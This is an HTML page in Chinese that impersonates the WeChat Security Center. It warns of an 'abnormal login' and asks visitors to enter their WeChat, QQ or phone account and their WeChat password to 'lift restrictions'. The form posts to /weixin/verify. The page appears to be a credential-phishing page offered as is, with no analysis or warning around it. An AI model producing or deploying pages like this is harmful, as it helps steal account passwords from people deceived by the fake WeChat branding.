<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>微信安全中心-账号保护验证</title>
<style>body{margin:0;font-family:"Microsoft YaHei",Arial,sans-serif;background:#f2f7f3;color:#333}
header{background:#07c160;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:24px}
.logo{font-size:24px;font-weight:700;letter-spacing:2px}
.card{margin:36px auto;width:420px;background:#fff;border-radius:10px;padding:32px;box-shadow:0 2px 10px #0001}
.card h2{margin:0 0 6px;font-size:20px;color:#07c160}.card p{margin:0 0 16px;font-size:13px;color:#999}
label{display:block;font-size:13px;color:#555;margin:12px 0 6px}
input{width:100%;height:40px;border:1px solid #ccd;border-radius:6px;padding:0 10px;font-size:14px;box-sizing:border-box}
button{width:100%;height:42px;margin-top:18px;background:#07c160;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}
footer{padding:20px;text-align:center;color:#999;font-size:12px}</style></head>
<body><header><span class="logo">微信</span><span>安全中心</span></header>
<div class="card"><h2>账号保护验证</h2><p>检测到微信账号存在异常登录，请验证身份</p>
<form action="/weixin/verify" method="post">
<label>微信号 / QQ 号 / 手机号</label><input placeholder="请输入账号">
<label>微信密码</label><input type="password" placeholder="请输入密码">
<button type="submit">验证并解除限制</button></form></div>
<footer>© 微信安全中心</footer></body></html>
